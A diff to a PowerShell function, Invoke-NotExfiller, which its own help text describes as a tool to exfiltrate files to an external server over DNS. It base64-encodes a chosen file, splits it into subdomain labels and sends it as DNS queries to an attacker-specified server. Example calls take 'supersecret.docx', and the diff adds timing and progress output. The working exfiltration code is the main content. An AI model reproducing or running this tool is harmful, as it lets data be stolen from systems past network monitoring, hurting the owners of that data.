@@ -1,4 +1,28 @@
 function Invoke-NotExfiller {
+    <#
+    .Description
+        Function to exfiltrate files to an external server on the DNS protocol.
+
+    .PARAMETER DNSServer
+        Define the target server listening on port UDP 53 to send the file to
+     
+    .PARAMETER File
+        The file to send to the external server
+     
+    .PARAMETER RequestLength
+        The number of characters to add in each request to the external server
+        Example: Length of 10 results in xxxxxxxxxx.test.local
+     
+    .PARAMETER Delay 
+        Time to wait (in milliseconds) between each request
+
+    .EXAMPLE
+        Invoke-NotExfiller -DNSServer 1.1.1.1 -File supersecret.docx
+
+    .EXAMPLE
+        Invoke-NotExfiller -DNSServer 1.1.1.1 -File supersecret.docx -RequestLength 50 -Delay 100
+    #> 
+
     [CmdletBinding()]
     Param (
         [Parameter(Mandatory=$true)][string]$DNSServer,
@@ -11,6 +35,10 @@ function Invoke-NotExfiller {
     if (!$RequestLength) { $RequestLength = 30 }
     if (!$Delay) { $Delay = 0 }
 
+    # Check that RequestLength is at or below the allowed length of 63
+    if ($RequestLength -gt 63) { Write-Output "`n[-] Invalid Request Length.  Please choose a value of 63 or lower."}
+
+    # Define target domain to query (Doesn't have to exist)
     $targetDomain = ".test.local"
 
     # Check the given file path is valid
@@ -31,7 +59,9 @@ function Invoke-NotExfiller {
 
     $totalRequests = [Math]::Floor($fileContentB64.Length/$RequestLength)+2
 
-    Write-Output "[*] Sending a total of $totalRequests DNS requests to $DNSServer"
+    $stopwatch =  [system.diagnostics.stopwatch]::StartNew()
+
+    Write-Output "`n[*] Sending a total of $totalRequests DNS requests to $DNSServer"
 
     # Send start of file identifier
     $requestString = "11111" + $File.replace('.', '-').replace('\', '') + "11111" + $targetDomain
@@ -61,7 +91,22 @@ function Invoke-NotExfiller {
     Resolve-DnsName -Name ($requestString) -Server $DNSServer -DnsOnly -Type A -NoHostsFile
 
 
-    Write-Output "[+] Successfully sent file '$File' over a total of $totalRequests requests to $DNSServer"
+    $stopwatch.Stop()
+    $time = [int]$stopwatch.Elapsed.TotalSeconds
+    Write-Output $time
+
+    Write-Output "`n[+] Successfully sent file '$File' over a total of $totalRequests requests to $DNSServer"
+
+    $minutes = [math]::Round($stopwatch.Elapsed.TotalSeconds / 60)
+    $seconds = [int]$stopwatch.Elapsed.TotalSeconds % 60
+
+    if ([int]$stopwatch.Elapsed.TotalSeconds -gt 60)
+    {
+        Write-Output "`n[*] Time elapsed: $minutes minute(s), $seconds seconds"
+    }
+    else {
+        Write-Output "`n[*] Time elapsed: $seconds seconds"
+    }
 
     #### 
     # Below can be used for troubleshooting to ensure the data is converted correctly
@@ -71,5 +116,3 @@ function Invoke-NotExfiller {
 
 
 }
-
-#Invoke-NotExfiller -DNSServer 192.168.51.108 -File test.docx
